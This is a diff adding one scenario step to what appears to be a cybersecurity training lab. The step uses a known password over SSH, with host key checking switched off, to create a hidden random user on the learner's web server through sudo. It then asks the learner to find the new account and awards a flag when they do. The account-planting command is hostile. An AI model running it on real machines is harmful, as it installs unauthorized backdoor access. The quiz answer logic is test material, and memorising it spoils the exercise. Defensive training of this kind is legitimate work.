@@ -1,0 +1,33 @@
+	<attack>
+
+<% $home_dir_dead2 = '/home/' + $third_user + '/'
+	 $rand_user_dead2 = (('a'..'z').to_a).sample + SecureRandom.hex(3)
+	 $rand_pass_dead2 = SecureRandom.hex(3) %>
+		<pre_shell>sshpass -p <%= $third_password %> ssh -oStrictHostKeyChecking=no <%= $third_user %>@<%= $web_server_ip %> 'echo "<%= $third_password %>" | sudo -S useradd -p $(openssl passwd -1 <%= $rand_pass_dead2 %>) <%= $rand_user_dead2 %> 2>/dev/null; echo "sudo useradd -p $(openssl passwd -1 <%= $rand_pass_dead2 %>) <%= $rand_user_dead2 %>" >> <%= $home_dir_dead2 %>.bash_history;';echo "OK"</pre_shell>
+
+		<get_shell>false</get_shell>
+		<post_command></post_command>
+
+		<prompt>About to do something to your web server, let it happen...</prompt>
+
+		<condition>
+			<output_matches>OK</output_matches>
+			<message>Ok, answer this.</message>
+			<trigger_quiz />
+		</condition>
+		<condition>
+			<output_matches>OK..</output_matches>
+			<message>Ok, answer this.</message>
+			<trigger_quiz />
+		</condition>
+		<else_condition>
+			<message>Ok...</message>
+		</else_condition>
+
+		<quiz>
+			<question>The <%= $third_user %> user has just added a new user to your web server. Find out what happened and provide the username of the new user.</question>
+			<answer><%= $rand_user_dead2 %></answer>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
+			<trigger_next_attack />
+		</quiz>
+	</attack>
